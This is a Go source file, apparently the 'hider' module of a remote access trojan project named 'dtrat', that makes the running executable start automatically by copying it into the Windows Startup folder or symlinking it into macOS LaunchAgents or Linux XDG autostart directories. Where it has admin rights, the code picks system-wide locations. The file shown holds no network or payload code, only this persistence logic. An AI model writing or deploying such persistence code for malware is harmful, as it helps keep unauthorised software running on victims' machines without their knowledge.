package hider

import (
	"dtrat/engine"
	"dtrat/errs"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

type Hider struct {
	eng *engine.Engine
}

func NewHider(eng *engine.Engine) (*Hider, error) {
	hdr := Hider{
		eng: eng,
	}
	return &hdr, nil
}

func (h *Hider) autostartOnWin(executablePath string) error {
	var startupPath string
	admin := h.eng.Info.IsRoot()

	if admin {
		startupPath = filepath.Join(os.Getenv("ProgramData"), "Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
	} else {
		startupPath = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	}

	destPath := filepath.Join(startupPath, filepath.Base(executablePath))

	err := copyFile(executablePath, destPath)
	if err != nil {
		return fmt.Errorf("copyFile: %w", err)
	}
	return nil
}

func (h *Hider) autostartOnLinux(executablePath string) error {
	var autostartDir string
	admin := h.eng.Info.IsRoot()

	switch runtime.GOOS {
	case "darwin":
		if admin {
			autostartDir = "/Library/LaunchAgents"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		}
	case "linux":
		if admin {
			autostartDir = "/etc/xdg/autostart"
		} else {
			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		}
	default:
		return errs.ErrUnsupportedOs
	}

	err := os.MkdirAll(autostartDir, 0755)
	if err != nil {
		return fmt.Errorf("os.MkdirAll: %w", err)
	}

	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
	err = os.Symlink(executablePath, destPath)
	if err != nil {
		return fmt.Errorf("os.Symlink: %w", err)
	}
	return nil
}

func (h *Hider) AddToStartup() error {
	executable, err := os.Executable()
	if err != nil {
		return fmt.Errorf("os.Executable: %w", err)
	}

	if runtime.GOOS == "windows" {
		return h.autostartOnWin(executable)
	} else {
		return h.autostartOnLinux(executable)
	}
}

func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	err = os.WriteFile(dst, input, 0644)
	return err
}
